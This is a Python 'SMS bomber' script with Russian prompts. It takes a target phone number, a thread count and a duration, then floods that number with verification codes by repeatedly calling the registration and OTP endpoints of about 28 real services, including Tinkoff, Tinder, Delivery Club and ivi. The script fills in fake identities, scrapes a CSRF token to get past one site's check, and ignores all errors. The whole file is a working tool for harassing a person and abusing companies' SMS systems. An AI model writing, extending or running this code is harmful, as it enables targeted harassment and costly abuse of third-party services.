import requests
import threading

phone = input('Введите номер (без +): ')
countT = int(input('Потоков: '))
runfor = int(input("Введите время спама: "))

import time


def mv():
    request_timeout = 0.0000000001

    while True:
        try:
            requests.post(
                'https://belkacar.ru/get-confirmation-code',
                data={'phone': phone},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://www.citilink.ru/registration/confirm/phone/+' + phone
                + '/',
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://online-api.dozarplati.com/rpc',
                json={
                    'id': 1,
                    'jsonrpc': '2.0',
                    'method': 'auth.login',
                    'params': {
                        'phoneNumber': phone
                    }
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://lenta.com/api/v1/authentication/requestValidationCode',
                json={'phone': '+' + phone},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://newnext.ru/graphql',
                json={
                    'operationName':
                    'registration',
                    'variables': {
                        'client': {
                            'firstName': 'Иван',
                            'lastName': 'Иванов',
                            'phone': phone,
                            'typeKeys': ['Unemployed']
                        }
                    },
                    'query':
                    'mutation registration($client: ClientInput!) {'
                    '\n  registration(client: $client) {'
                    '\n    token\n    __typename\n  }\n}\n'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.get(
                'https://api.pswallet.ru/system/smsCode',
                params={
                    'mobile': phone,
                    'type': '0'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                data={'phone_number': phone},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://cabinet.wi-fi.ru/api/auth/by-sms',
                data={'msisdn': phone},
                headers={'App-ID': 'cabinet'},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://api.tinkoff.ru/v1/sign_up',
                data={'phone': '+' + phone},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                "https://www.stoloto.ru/send-mobile-app-link",
                data={'phone': phone},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                "https://api.mtstv.ru/v1/users",
                data={'msisdn': phone},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                "https://gorzdrav.org/login/register/sms/send",
                data={'phone': phone[1:]},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+"
                + phone[0:1] + "%20(" + phone[1:4] + ")" + phone[4:7] + "-" +
                phone[7:9] + "-" + phone[9:],
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.get(
                "https://findclone.ru/register?phone=+" + phone,
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                "https://apteka366.ru/login/register/sms/send",
                data={'phone': phone[1:]},
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                data={
                    'phoneNumber': phone,
                    'countryCode': 'ID',
                    'name': 'Alexey',
                    'email': 'alexey173949@gmail.com',
                    'deviceToken': '*'
                },
                headers={
                    'User-Agent':
                    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            a = requests.get('https://driver.gett.ru/signup/')
            requests.post(
                'https://driver.gett.ru/api/login/phone/',
                data={
                    'phone': phone,
                    'registration': 'true'
                },
                headers={
                    'Accept-Encoding':
                    'gzip, deflate, br',
                    'Accept-Language':
                    'en-US,en;q=0.5',
                    'Connection':
                    'keep-alive',
                    'Cookie':
                    'csrftoken=' + a.cookies['csrftoken'] +
                    '; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2',
                    'Host':
                    'driver.gett.ru',
                    'Referer':
                    'https://driver.gett.ru/signup/',
                    'User-Agent':
                    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                    'X-CSRFToken':
                    a.cookies['csrftoken']
                })
        except Exception as e:
            pass

        try:
            requests.post(
                'https://api-production.viasat.ru/api/v1/auth_codes',
                data={'msisdn': phone},
                headers={
                    'Accept-Encoding':
                    'gzip, deflate, br',
                    'Accept-Language':
                    'ru',
                    'Connection':
                    'keep-alive',
                    'Host':
                    'api-production.viasat.ru',
                    'Origin':
                    'https://vipplay.ru',
                    'Referer':
                    'https://vipplay.ru/',
                    'User-Agent':
                    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                    'X-Requested-With':
                    'XMLHttpRequest'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506',
                data={
                    "REGISTER_PHIS[LOGIN]": "asaofjkiawhwjk@mail.ru",
                    "REGISTER_PHIS[PHONE]": phone,
                    "REGISTER_PHIS[PASSWORD]": "asaofjkiawhwjk@mail.ru",
                    "REGISTER_PHIS[RULES]": "Y"
                },
                headers={
                    'Accept-Language':
                    'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection':
                    'keep-alive',
                    'Host':
                    'www.maxidom.ru',
                    'origin':
                    'https://www.maxidom.ru/',
                    'Referer':
                    'https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://youla.ru/web-api/auth/request_code',
                data={"phone": phone},
                headers={
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection': 'keep-alive',
                    'Host': 'youla.ru',
                    'origin': 'https://youla.ru',
                    'Referer': 'https://youla.ru/surgut'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://beta.delivery-club.ru/api/user/otp',
                data={"phone": phone},
                headers={
                    'Accept-Language':
                    'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection':
                    'keep-alive',
                    'Host':
                    'beta.delivery-club.ru',
                    'origin':
                    'https://beta.delivery-club.ru',
                    'Referer':
                    'https://beta.delivery-club.ru/entities/food?authPopupOpened=1'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://api.sunlight.net/v3/customers/authorization/',
                data={"phone": phone},
                headers={
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection': 'keep-alive',
                    'Host': 'api.sunlight.net',
                    'origin': 'https://sunlight.net/',
                    'Referer':
                    'https://sunlight.net/profile/login/?next=/profile/'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',
                data={
                    "phone": phone,
                    "oper": "9"
                },
                headers={
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection': 'keep-alive',
                    'Host': 'register.sipnet.ru',
                    'origin': 'https://www.sipnet.ru/',
                    'Referer': 'https://www.sipnet.ru/tarify-ip-telefonii'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
                data={"phone": phone},
                headers={
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection': 'keep-alive',
                    'Host': 'api.ivi.ru',
                    'origin': 'https://www.ivi.ru/',
                    'Referer': 'https://www.ivi.ru/profile'
                },
                timeout=request_timeout)
        except Exception as e:
            pass

        try:
            requests.post(
                'https://koronapay.com/transfers/online/api/users/otps',
                data={"phone": phone},
                headers={
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection': 'keep-alive',
                    'Host': 'koronapay.com',
                    'origin': 'https://koronapay.com',
                    'Referer': 'https://koronapay.com/transfers/online/login'
                },
                timeout=request_timeout)
        except Exception as e:
            pass


if len(phone) == 11:
    threads = []
    for item in range(countT):
        x = threading.Thread(target=mv)
        threads.append(x)

        x.start()
    time.sleep(runfor * 60)

else:
    print('Номер указон не коректно')
    input()
